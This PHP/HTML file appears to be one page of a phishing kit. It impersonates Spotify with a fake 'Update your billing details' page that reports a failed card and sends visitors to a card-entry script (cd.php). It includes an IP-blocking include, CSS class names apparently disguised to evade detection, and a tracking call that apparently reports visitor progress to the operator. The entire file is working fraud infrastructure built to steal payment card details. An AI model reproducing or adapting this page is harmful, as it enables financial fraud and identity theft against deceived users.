<?php 
require '../main.php';
require_once 'blockip.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="./img/fav.ico">
    <title data-translate="page-title">Spotify - Update Billing Details</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Circular', Arial, sans-serif;
        }
        
        body {
            background-color: #121212;
            color: white;
            min-height: 100vh;
        }
        
        .sushi {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            background-color: #000;
        }
        
        .ramen {
            display: flex;
            align-items: center;
        }
        
        .ramen img {
            height: 40px;
        }
        
        .tempura {
            display: flex;
            align-items: center;
            gap: 30px;
        }
        
        .udon {
            display: flex;
            gap: 30px;
        }
        
        .udon a {
            color: white;
            text-decoration: none;
            font-weight: 600;
            font-size: 16px;
        }
        
        .miso {
            display: flex;
            align-items: center;
            gap: 5px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 23px;
            padding: 5px 10px;
            cursor: pointer;
        }
        
        .tofu {
            width: 30px;
            height: 30px;
            background-color: #535353;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .tofu img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .wasabi {
            font-weight: 700;
            margin-right: 5px;
        }
        
        .main-content {
            max-width: 600px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        
        .page-title {
            font-size: 36px;
            font-weight: 900;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.1;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background-color: #333;
            border-radius: 2px;
            margin-bottom: 40px;
            overflow: hidden;
        }
        
        .progress-fill {
            width: 66.66%;
            height: 100%;
            background-color: #1ED760;
            border-radius: 2px;
        }
        
        .step-info {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
        }
        
        .back-arrow {
            width: 24px;
            height: 24px;
            cursor: pointer;
        }
        
        .step-text {
            color: #b3b3b3;
            font-size: 14px;
            font-weight: 400;
        }
        
        .step-title {
            color: white;
            font-size: 16px;
            font-weight: 700;
        }
        
        .section-title {
            font-size: 24px;
            font-weight: 900;
            margin-bottom: 12px;
        }
        
        .section-subtitle {
            color: #b3b3b3;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .cards-section-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 20px;
        }
        
        .card-item {
            background-color: #181818;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .card-info {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .card-icon {
            <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                <rect x="1" y="4" width="22" height="16" rx="2" ry="2" fill="none" stroke="currentColor" stroke-width="2"></rect>
                <line x1="1" y1="10" x2="23" y2="10" stroke="currentColor" stroke-width="2"></line>
            </svg>
        }
        
        .card-number {
            font-size: 16px;
            font-weight: 400;
            color: white;
        }
        
        .card-status {
            color: #f15e6c;
            font-size: 14px;
            font-weight: 600;
        }
        
        .update-button {
            display: block;
            width: 200px;
            padding: 16px 32px;
            background-color: #1ED760;
            color: #000;
            font-weight: 700;
            font-size: 16px;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            margin: 40px auto 0;
            transition: background-color 0.2s ease;
        }
        
        .update-button:hover {
            background-color: #1fdf64;
        }
        
        @media (max-width: 768px) {
            .sushi {
                padding: 15px 20px;
            }
            
            .udon {
                gap: 15px;
            }
            
            .page-title {
                font-size: 36px;
            }
            
            .section-title {
                font-size: 28px;
            }
            
            .main-content {
                padding: 40px 20px;
            }
        }
        
        @media (max-width: 576px) {
            .sushi {
                padding: 10px 15px;
            }
            
            .ramen img {
                width: 100px;
                height: 40px;
            }
            
            .udon {
                display: none;
            }
            
            .miso {
                padding: 3px 8px;
            }
            
            .tofu {
                width: 25px;
                height: 25px;
            }
            
            .wasabi {
                font-size: 14px;
            }
            
            .tempura {
                gap: 15px;
            }
            
            .page-title {
                font-size: 28px;
                margin-bottom: 30px;
            }
            
            .section-title {
                font-size: 20px;
            }
            
            .card-item {
                padding: 16px;
            }
            
            .update-button {
                width: 180px;
                padding: 14px 28px;
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <nav class="sushi">
        <div class="ramen">
            <img src="./img/lggo.webp">
        </div>
        
        <div class="tempura">
            <div class="udon">
                <a data-translate="premium">Premium</a>
                <a data-translate="support">Support</a>
                <a data-translate="download">Download</a>
            </div>
            
            <div class="miso">
                <div class="tofu">
                    <img src="./img/proff.webp">
                </div>
                <span class="wasabi" data-translate="profile">Profile</span>
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M4 6L8 10L12 6" stroke="white" stroke-width="2" stroke-linecap="round"/>
                </svg>
            </div>
        </div>
    </nav>
    
    <div class="main-content">
        <h1 class="page-title" data-translate="update-billing-title">Update your billing details</h1>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="step-info">
            <svg class="back-arrow" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M19 12H5M12 19L5 12L12 5" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            <div>
                <div class="step-text" data-translate="step-indicator">Step 1 of 3</div>
                <div class="step-title" data-translate="step-title">Update your billing</div>
            </div>
        </div>
        
        <h2 class="section-title" data-translate="payment-cards-title">Payment Cards</h2>
        <p class="section-subtitle" data-translate="payment-cards-subtitle">To activate your account please update your card details</p>
        
        <h3 class="cards-section-title" data-translate="my-cards">My cards</h3>
        
        <div class="card-item">
            <div class="card-info">
                <div class="card-icon">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" fill="none" stroke="currentColor" stroke-width="2"></rect>
                        <line x1="1" y1="10" x2="23" y2="10" stroke="currentColor" stroke-width="2"></line>
                    </svg>
                </div>
                <span class="card-number">•••• •••• •••• ••••</span>
            </div>
            <span class="card-status" data-translate="card-status">Failed</span>
        </div>
        
        <a class="update-button" data-translate="update-button" href="cd.php">Update</a>
    </div>

    <script src="./js/aff.js"></script>
<script src="js/jq.js"></script>
<?php $m->ctr("➡️ Update ➡️➡️".@$_GET['e']); ?>
</body></html>